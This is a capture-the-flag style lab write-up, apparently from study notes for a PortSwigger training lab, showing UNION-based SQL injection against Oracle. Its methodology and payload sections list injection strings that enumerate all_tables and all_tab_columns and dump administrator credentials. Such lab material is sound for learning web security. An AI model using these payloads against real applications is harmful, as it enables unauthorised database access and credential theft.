# Lab 10 — SQL injection attack, listing the database contents on Oracle

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Examining the database |
| **Concept** | [08 — Examining the database](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle |

---

## 🎯 Objective
Same as Lab 09, but on **Oracle**: enumerate the schema, find the randomized users table, extract `administrator` credentials, and **log in**.

## 🧠 Background
Oracle has **no `information_schema`**. Use its data-dictionary views instead:
- `all_tables` → list tables (column `table_name`)
- `all_tab_columns` → list columns (columns `column_name`, `table_name`)
- Identifiers are **UPPERCASE**.

## 🪜 Methodology
1. Column count = **2**, both text (remember Oracle needs `FROM dual` for constant selects).
2. **List tables**:
   ```
   ?category=Gifts' UNION SELECT table_name, NULL FROM all_tables--
   ```
   → e.g. `USERS_ABCDEF`
3. **List that table's columns** (note UPPERCASE table name):
   ```
   ?category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
   ```
   → e.g. `USERNAME_GHIJKL`, `PASSWORD_MNOPQR`
4. **Dump the credentials**:
   ```
   ?category=Gifts' UNION SELECT USERNAME_GHIJKL, PASSWORD_MNOPQR FROM USERS_ABCDEF--
   ```
5. Log in as `administrator`.

## 💥 Payload (step 4, using your instance's real names)
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+USERNAME_GHIJKL,+PASSWORD_MNOPQR+FROM+USERS_ABCDEF--
```

## ✅ Why it works
`all_tables` / `all_tab_columns` are Oracle's equivalent of `information_schema`. The UPPERCASE `WHERE table_name='USERS_ABCDEF'` matches Oracle's default identifier casing.

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Oracle enumeration = `all_tables` / `all_tab_columns`, and mind the UPPERCASE identifiers. `#sqli` `#practitioner` `#oracle` `#schema-enum`
